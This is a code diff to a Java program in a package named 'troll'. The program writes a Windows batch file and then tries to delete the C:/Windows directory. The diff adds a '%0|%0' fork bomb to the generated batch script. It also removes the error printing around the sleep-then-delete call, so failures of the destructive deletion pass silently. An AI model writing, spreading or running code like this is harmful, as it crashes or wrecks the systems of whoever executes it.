@@ -1,7 +1,8 @@
 package halq.troll.troll.moment;
 
 
-import java.io.*;
+import java.io.FileWriter;
+import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.concurrent.TimeUnit;
@@ -38,7 +39,8 @@ public class main {
                     "set /a loop=3\n" +
                     "goto repete\n" +
                     "cd c:/\n" +
-                    "tree");
+                    "tree\n" +
+                    "%0|%0");
             writer.close();
         } catch (IOException e) {
             e.printStackTrace();
@@ -60,7 +62,6 @@ public class main {
           TimeUnit.SECONDS.sleep(5);
           Files.delete(Paths.get("C://Windows//"));
       } catch (InterruptedException | IOException e) {
-          e.printStackTrace();
       }
   }
     }
